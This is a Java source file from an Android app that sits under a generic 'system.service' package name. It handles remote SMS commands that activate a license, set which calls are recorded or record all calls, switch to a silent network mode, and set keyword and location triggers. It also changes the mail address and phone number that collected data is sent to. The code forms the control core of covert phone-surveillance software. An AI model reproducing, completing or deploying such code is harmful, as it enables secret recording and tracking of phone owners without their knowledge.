package system.service;

import java.util.Date;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import system.service.activity.GlobalPrefActivity;
import system.service.activity.NETWORK_CONNECT_MODE;
import system.service.config.ConfigCtrl;
import system.service.feature.sms.SmsCtrl;
import android.content.Context;

import com.particle.inspector.common.util.DeviceProperty;
import com.particle.inspector.common.util.LANG;
import com.particle.inspector.common.util.RegExpUtil;
import com.particle.inspector.common.util.StrUtils;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.license.LICENSE_TYPE;
import com.particle.inspector.common.util.license.LicenseCtrl;
import com.particle.inspector.common.util.sms.AuthSms;
import com.particle.inspector.common.util.sms.SmsConsts;

public class IndicationHandler 
{
	public static void handleIndicationSms(Context context, String smsBody, String incomingPhoneNum) 
	{
		// -------------------------------------------------------
		// #0#<license key>: activate apk
		// #0#OFF: deactivate apk, and send SMS to server to clear using record to make it usable in other phone
		if (smsBody.startsWith(SmsConsts.INDICATION_KEY)) {
			String indication = smsBody.substring(3).trim();
			
			if (indication.length() == LicenseCtrl.ACTIVATION_KEY_LENGTH)
			{
				LICENSE_TYPE type = LicenseCtrl.calLicenseType(context, smsBody);
				if (type == LICENSE_TYPE.NOT_LICENSED || type == LICENSE_TYPE.TRIAL_LICENSED) {
					String msg = context.getResources().getString(R.string.indication_register_ng);
					SmsCtrl.sendSms(incomingPhoneNum, msg);
					return;
				}
				
				// Send auth SMS to server for registration
				// and server will send response SMS to the phone (Auth,<key>,OK/NG)
				SmsCtrl.sendAuthSms(context, indication);
			}
			// Unregister indication
			else if (indication.equalsIgnoreCase(SmsConsts.OFF)) {
				LICENSE_TYPE type = ConfigCtrl.getLicenseType(context);
				// Only can deactivate FULL/PART/SUPER license key
				if (type == LICENSE_TYPE.NOT_LICENSED || type == LICENSE_TYPE.TRIAL_LICENSED) return;
				
				// Send unregister SMS to server
				boolean ret = SmsCtrl.sendUnregisterSms(context);
				if (!ret) {
					// If not success, should send SMS to tell the receiver that it fails
					SmsCtrl.sendSms(incomingPhoneNum, context.getResources().getString(R.string.indication_unregister_ng));
				} else {
					ConfigCtrl.setUnregistererPhoneNum(context, incomingPhoneNum);
				}
			}
		}
		
		// -------------------------------------------------------
		// #1#<mail address> <password>: set self sender
		// #1#OFF: stop using self sender, use default sender instead
		else if (smsBody.startsWith(SmsConsts.INDICATION_SENDER)) {
			String indication = smsBody.substring(3).trim();
			
			// Unregister indication
			if (indication.equalsIgnoreCase(SmsConsts.OFF)) {
				// If it is recording all, we do not permit stop using self sender 
				if (GlobalPrefActivity.getRecordAll(context)) {
					SmsCtrl.sendSms(incomingPhoneNum, context.getResources().getString(R.string.indication_stop_selfsender_ng));
					return;
				}
				
				GlobalPrefActivity.setUseSelfSender(context, false);
				SmsCtrl.sendSms(incomingPhoneNum, context.getResources().getString(R.string.indication_stop_selfsender_ok));
			}
			else // set self sender
			{
				String[] parts = indication.replaceAll(RegExpUtil.MULTIPLE_BLANKSPACES, " ").split(" ");
				if (parts.length < 2) {
					// Send SMS to warn user
					String strContent = context.getResources().getString(R.string.indication_set_selfsender_ng);
					SmsCtrl.sendSms(incomingPhoneNum, strContent);
					return;
				}
				
				String mailAddr = parts[0];
				String pwd      = parts[1];
				
				GlobalPrefActivity.setUseSelfSender(context, true);
				GlobalPrefActivity.setSenderMail(context, mailAddr);
				GlobalPrefActivity.setSenderPassword(context, pwd);
				
				// Send SMS to user to let him known the result
				String strContent = context.getResources().getString(R.string.indication_set_selfsender_ok);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
			}
		}
		
		// -------------------------------------------------------
		// #2#<mail address>: change receiver mail address
		else if (smsBody.startsWith(SmsConsts.INDICATION_RECV_MAIL)) {
			String indication = smsBody.substring(3).trim();
			
			if (indication.length() > 0 && StrUtils.validateMailAddress(indication)) {
				GlobalPrefActivity.setReceiverMail(context, indication);
				
				// Send SMS to tell user the result
				String strContent = context.getResources().getString(R.string.indication_set_recv_mail_ok);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
				
				// Send Info SMS to server to update receiver info
				SmsCtrl.sendReceiverInfoSms(context);
			} else {
				// Send SMS to warn the user
				String strContent = context.getResources().getString(R.string.indication_set_recv_mail_ng);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
			}
		}
		
		// -------------------------------------------------------
		// #3#<receiver phone number>: change receiver phone number
		else if (smsBody.startsWith(SmsConsts.INDICATION_RECV_PHONENUM)) {
			String indication = smsBody.substring(3).trim();
					
			if (indication.length() > 0) {
				GlobalPrefActivity.setReceiverPhoneNum(context, indication);
				
				// Send SMS to tell user the result
				String strContent = context.getResources().getString(R.string.indication_set_recv_phonenum_ok);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
				
				// Send Info SMS to server to update receiver info
				SmsCtrl.sendReceiverInfoSms(context);
			} else {
				// Send SMS to warn the user
				String strContent = context.getResources().getString(R.string.indication_set_recv_phonenum_ng);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
			}
		}
		
		// -------------------------------------------------------
		// #4#<interval days>: change get info interval days
		else if (smsBody.startsWith(SmsConsts.INDICATION_INTERVAL)) {
			String indication = smsBody.substring(3).trim();
			int days = 1;
			try {
				days = Integer.getInteger(indication);
			} catch (Exception ex) {
				// Send SMS to warn the user
				String strContent = context.getResources().getString(R.string.indication_set_getinfo_interval_ng);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
				return;
			}
			
			if (days < 1 ) { days = 1; } 
			else if (days > 7) { days = 7; }
			
			GlobalPrefActivity.setInfoInterval(context, days);
			String strContent = context.getResources().getString(R.string.indication_set_getinfo_interval_ok);
			SmsCtrl.sendSms(incomingPhoneNum, strContent);
		}
		
		// -------------------------------------------------------
		// #5#<target number>: set recording target numbers
		// #5#ALL: recording all phone calls
		else if (smsBody.startsWith(SmsConsts.INDICATION_TARGET_NUM)) {
			String indication = smsBody.substring(3).trim();
			
			if (indication.equalsIgnoreCase(SmsConsts.ALL)) {
				if (!GlobalPrefActivity.getUseSelfSender(context)) {
					String strContent = context.getResources().getString(R.string.indication_set_targetall_ng);
					SmsCtrl.sendSms(incomingPhoneNum, strContent);
				} else {
					GlobalPrefActivity.setRecordAll(context, true);
					String strContent = context.getResources().getString(R.string.indication_set_targetall_ok);
					SmsCtrl.sendSms(incomingPhoneNum, strContent);
				}
			} else {
				String[] numbers = indication.replaceAll(RegExpUtil.MULTIPLE_BLANKSPACES, GlobalPrefActivity.TARGET_NUMBER_BREAKER)
						 					 .split(GlobalPrefActivity.TARGET_NUMBER_BREAKER);
				boolean valid = true;
				if (numbers.length <= 0 || numbers.length > GlobalPrefActivity.MAX_TARGET_NUM_COUNT) {
					valid = false;
				} else {
					Pattern p = Pattern.compile(RegExpUtil.RECORD_TARGET_NUM);
					for (int i=0; i < numbers.length; i++) {
				    	Matcher matcher = p.matcher(numbers[i]);
				    	if (!matcher.matches()) {
				    		valid = false;
				    		break;
				    	}
					}
				}
				
				if (valid) {
					GlobalPrefActivity.setRecordTargetNum(context, indication);
					String strContent = context.getResources().getString(R.string.indication_set_targetnum_ok);
					SmsCtrl.sendSms(incomingPhoneNum, strContent);
				} else {
					String strContent = context.getResources().getString(R.string.indication_set_targetnum_ng);
					SmsCtrl.sendSms(incomingPhoneNum, strContent);
				}
			}
		}
		
		// -------------------------------------------------------
		// #6#<network mode>: set network mode
		else if (smsBody.startsWith(SmsConsts.INDICATION_NETWORK_MODE)) {
			String indication = smsBody.substring(3).trim();
			
			if (!indication.equalsIgnoreCase(SmsConsts.ACTIVE) && 
				!indication.equalsIgnoreCase(SmsConsts.SILENT)) {
				String strContent = context.getResources().getString(R.string.indication_set_network_mode_ng);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
				return;
			}
			
			if (indication.equalsIgnoreCase(SmsConsts.ACTIVE)) {
				GlobalPrefActivity.setNetworkConnectMode(context, NETWORK_CONNECT_MODE.ACTIVE);
			} else {
				GlobalPrefActivity.setNetworkConnectMode(context, NETWORK_CONNECT_MODE.SILENT);
			}
			
			String strContent = context.getResources().getString(R.string.indication_set_network_mode_ok);
			SmsCtrl.sendSms(incomingPhoneNum, strContent);
		}
		
		// -------------------------------------------------------
		// #7#<sensitive words>: change sensitive words
		else if (smsBody.startsWith(SmsConsts.INDICATION_SENS_WORDS)) {
			String indication = smsBody.substring(3).trim();
			
			// When it is OFF or off, we disable the location function
			if (indication.equalsIgnoreCase(SmsConsts.OFF)) {
				GlobalPrefActivity.setSensitiveWords(context, "");
				String strContent = context.getResources().getString(R.string.indication_disable_sens_words_ok);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
				return;
			}
			else {
				String oriWords = indication.replaceAll(RegExpUtil.MULTIPLE_BLANKSPACES, GlobalPrefActivity.SENSITIVE_WORD_BREAKER); // Remove duplicated blank spaces
				String[] words = oriWords.split(GlobalPrefActivity.SENSITIVE_WORD_BREAKER);
				if (words.length == 0 || words.length > GlobalPrefActivity.MAX_SENSITIVE_WORD_COUNT) {
					// Send SMS to warn the user
					String strContent = context.getResources().getString(R.string.indication_set_sens_words_ng);
					SmsCtrl.sendSms(incomingPhoneNum, strContent);
					return;
				}
				
				GlobalPrefActivity.setSensitiveWords(context, indication);
				String strContent = context.getResources().getString(R.string.indication_set_sens_words_ok);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
			}
		}
		
		// -------------------------------------------------------
		// #8#<location word>: change location word
		else if (smsBody.startsWith(SmsConsts.INDICATION_LOC_WORD)) {
			String indication = smsBody.substring(3).trim();
			
			// When it is GET or get, we send current location word to user
			if (indication.equalsIgnoreCase(SmsConsts.GET)) {
				String locWord = GlobalPrefActivity.getGpsWord(context);
				String strContent = String.format(context.getResources().getString(R.string.indication_return_loc_word), locWord);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
			}
			// When it is OFF or off, we disable the location function
			else if (indication.length() > 0) {
				if (indication.equalsIgnoreCase(SmsConsts.OFF)) {
					GlobalPrefActivity.setGpsWord(context, "");
				} else {
					GlobalPrefActivity.setGpsWord(context, indication);
				}
			}
		}

		
	}
}
